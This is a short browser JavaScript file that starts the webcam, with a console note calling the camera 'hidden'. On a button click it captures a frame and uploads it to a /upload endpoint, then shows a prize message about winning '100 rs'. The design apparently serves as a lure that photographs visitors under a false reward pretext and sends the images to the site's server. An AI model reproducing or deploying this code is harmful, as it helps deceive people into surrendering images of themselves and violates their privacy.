const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const statusText = document.getElementById('status');

// Camera access setup
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    console.log("Camera started (hidden).");
  } catch (err) {
    console.error("Camera not accessible:", err);
  }
}

// Capture and upload
captureBtn.addEventListener('click', async () => {
  statusText.textContent = "Processing...";
  
  const context = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append('photo', blob, 'capture.png');

    try {
      const response = await fetch('/upload', {
        method: 'POST',
        body: formData
      });

      const result = await response.json();

      if (result.success) {
        statusText.textContent = "🎉 You got 100 rs successfully!";
      } else {
        statusText.textContent = "❌ You lost 100 rs successfully!";
      }
    } catch (err) {
      console.error(err);
      statusText.textContent = "⚠️ Error occurred!";
    }
  }, 'image/png');
});

startCamera();